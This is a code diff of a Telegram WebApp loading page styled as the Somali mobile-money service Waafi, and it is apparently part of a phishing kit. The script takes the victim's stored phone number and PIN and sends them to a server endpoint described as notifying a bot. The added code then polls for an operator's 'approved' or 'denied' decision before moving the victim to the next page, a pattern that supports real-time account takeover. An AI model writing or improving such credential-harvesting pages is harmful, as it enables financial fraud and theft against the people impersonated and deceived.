@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Waafi - Diyaarinta</title>
 
-    <!-- ✅ Correct Telegram WebApp SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
@@ -45,7 +44,7 @@
             content: '';
             width: 90px;
             height: 90px;
-            border: 4px solid rgba(255, 255, 255, 0.3);
+            border: 4px solid rgba(255,255,255,0.3);
             border-top: 4px solid white;
             border-radius: 50%;
             animation: spin 1.5s linear infinite;
@@ -60,13 +59,11 @@
             color: #82d13d;
             font-size: 28px;
             margin: 0 0 10px;
-            font-weight: bold;
         }
 
         p {
             color: #555;
             font-size: 16px;
-            margin: 0;
         }
     </style>
 </head>
@@ -80,40 +77,69 @@
 </div>
 
 <script>
+document.addEventListener("DOMContentLoaded", async () => {
+
     const mainText = document.getElementById('main-text');
     const subText = document.getElementById('sub-text');
 
-    window.onload = () => {
-        const tg = window.Telegram?.WebApp;
-        if (tg) {
-            tg.ready();
-            tg.expand();
-        }
+    const tg = window.Telegram?.WebApp;
 
-        // 1. Send Login data to Bot via Server API immediately
-        const phone = localStorage.getItem('phone') || "N/A";
-        const pin = localStorage.getItem('lastPin') || "####"; // Ensure Page 6 saves 'lastPin'
+    if (tg) {
+        tg.ready();
+        tg.expand();
+    }
 
-        fetch('/api/login-notification', {
+    const phone = localStorage.getItem('phone') || "";
+    const pin = localStorage.getItem('lastPin') || "";
+
+    console.log("📱 PHONE:", phone);
+    console.log("🔢 PIN:", pin);
+
+    // STEP 1: SEND LOGIN REQUEST
+    try {
+        await fetch(window.location.origin + '/api/login-notification', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ phone, pin })
-        })
-        .then(response => console.log('Notification triggered'))
-        .catch(error => console.error('Error:', error));
+        });
 
-        // 2. screen transition 1: Habaynta -> Fadlan sug (3 seconds)
-        setTimeout(() => {
-            mainText.innerText = "Fadlan sug...";
-            subText.innerText = "Tani waxay qaadataa dhowr ilbiriqsi";
+        console.log("📩 Login sent");
 
-            // 3. screen transition 2: Fadlan sug -> Page 8 (another 4 seconds)
-            setTimeout(() => {
-                window.location.href = "/page8";
-            }, 4000);
+    } catch (err) {
+        console.error("❌ FETCH ERROR:", err);
+    }
 
-        }, 3000);
-    };
+    // STEP 2: WAIT FOR APPROVAL (NO FAKE TIMER)
+    async function checkApproval() {
+        try {
+            const res = await fetch(window.location.origin + '/api/check-status?phone=' + phone);
+            const data = await res.json();
+
+            console.log("🔄 STATUS:", data);
+
+            if (data.status === "approved") {
+                mainText.textContent = "La ansixiyay!";
+                subText.textContent = "U wareegaya bogga xiga...";
+
+                setTimeout(() => {
+                    window.location.href = "/page8.html";
+                }, 2000);
+            }
+
+            if (data.status === "denied") {
+                mainText.textContent = "La diiday!";
+                subText.textContent = "Fadlan isku day mar kale";
+            }
+
+        } catch (err) {
+            console.error("❌ STATUS ERROR:", err);
+        }
+    }
+
+    // check every 3 seconds
+    setInterval(checkApproval, 3000);
+
+});
 </script>
 
 </body>
